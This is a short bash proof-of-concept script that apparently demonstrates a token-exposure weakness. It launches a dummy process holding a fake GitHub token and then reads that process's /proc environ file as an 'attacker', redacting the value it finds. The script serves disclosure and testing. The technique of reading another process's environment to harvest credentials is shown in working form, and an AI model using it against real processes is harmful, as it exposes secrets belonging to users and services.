#!/usr/bin/env bash
set -euo pipefail

if [[ "$(uname -s)" != "Linux" ]]; then
  echo "[skip] /proc environ proof requires Linux"
  exit 0
fi

FAKE_TOKEN="ghs_demo_not_real_00000000000000000000"

echo "[token-demo] starting a synthetic victim process with a fake token"
env FAKE_GITHUB_TOKEN="$FAKE_TOKEN" bash -c '
  echo "[victim] pid=$$"
  sleep 20
' &
victim_pid=$!

cleanup() {
  kill "$victim_pid" 2>/dev/null || true
  wait "$victim_pid" 2>/dev/null || true
}
trap cleanup EXIT

sleep 1

echo "[token-demo] attacker reads /proc/$victim_pid/environ"
if [[ ! -r "/proc/$victim_pid/environ" ]]; then
  echo "[token-demo] /proc/$victim_pid/environ is not readable; this host blocks the exposure"
  exit 0
fi

leaked="$(
  tr "\0" "\n" < "/proc/$victim_pid/environ" |
    sed -n "s/^FAKE_GITHUB_TOKEN=.*/FAKE_GITHUB_TOKEN=ghs_demo_not_real_[redacted]/p"
)"

if [[ -z "$leaked" ]]; then
  echo "[token-demo] fake token was not visible"
  exit 1
fi

echo "[token-demo] synthetic exposure observed: $leaked"
echo "[token-demo] no real GITHUB_TOKEN or repository secret was read"
